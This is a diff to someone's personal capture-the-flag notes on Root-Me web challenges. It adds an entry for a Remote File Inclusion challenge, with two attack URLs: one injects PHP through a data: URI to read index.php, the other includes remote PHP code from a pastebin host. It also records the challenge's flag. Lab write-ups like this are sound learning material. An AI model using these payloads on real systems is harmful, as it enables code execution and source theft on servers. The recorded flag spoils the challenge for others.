@@ -125,10 +125,11 @@ change into: http://challenge01.root-me.org/web-serveur/ch52/?url=https://google
 		  "/" double url decode: %252F
 		  fuking méo để ý .
 
-
-
-
-
+23. Remote File Inclusion - Abbreviated RFI: Read index.php through RFI	
+						 http://challenge01.root-me.org/web-serveur/ch13/index.php?lang=data:text/plain,<?php echo(file_get_contents("index.php")); ?>
+					or : http://challenge01.root-me.org/web-serveur/ch13/index.php?lang=http://www.pastebin.co.kr/view/raw/360ca5a3?
+								<with code php in pastebin>
+	>>>R3m0t3_iS_r3aL1y_3v1l 
 
 
 
